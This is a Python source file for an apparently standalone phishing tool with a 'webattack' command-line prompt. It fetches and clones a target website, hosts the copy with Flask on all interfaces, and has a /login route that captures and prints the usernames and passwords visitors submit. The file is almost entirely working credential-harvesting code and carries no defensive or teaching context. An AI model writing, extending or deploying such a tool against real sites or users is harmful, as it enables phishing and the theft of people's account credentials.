import os
import requests
from flask import Flask, request, render_template_string
from bs4 import BeautifulSoup
import sys

app = Flask(__name__)

# Function to fetch and clone a target webpage
def clone_website(target_url):
    try:
        # Fetch the webpage
        response = requests.get(target_url)
        if response.status_code != 200:
            print(f"Failed to fetch {target_url}. Status code: {response.status_code}")
            return None
        
        # Parse the HTML of the target page
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # For simplicity, we return the HTML content (you can refine this further)
        return soup.prettify()
    except Exception as e:
        print(f"Error occurred: {str(e)}")
        return None

# Route to serve the cloned page
@app.route('/')
def index():
    return render_template_string(cloned_page)

# Route to handle login form submission
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    print(f"Captured Credentials - Username: {username}, Password: {password}")
    return "Credentials received. Thank you!"

def start_flask_server():
    # Start Flask web server to host the cloned site
    app.run(debug=True, host='0.0.0.0', port=5000)

def main():
    # CLI loop
    while True:
        # Command prompt
        command = input("webattack > ").strip()
        
        # If command is 'clone', then clone the website
        if command.startswith("clone"):
            _, target_url = command.split(" ", 1)
            print(f"Cloning {target_url}...")
            
            # Clone the website
            global cloned_page
            cloned_page = clone_website(target_url)
            
            if cloned_page:
                print(f"Successfully cloned {target_url}. Hosting using Flask...")
                start_flask_server()
            else:
                print(f"Failed to clone {target_url}.")
        
        # Exit the program
        elif command == "exit":
            print("Exiting webattack CLI.")
            sys.exit()

        else:
            print("Invalid command. Use 'clone <target_url>' to clone a website.")

if __name__ == '__main__':
    main()
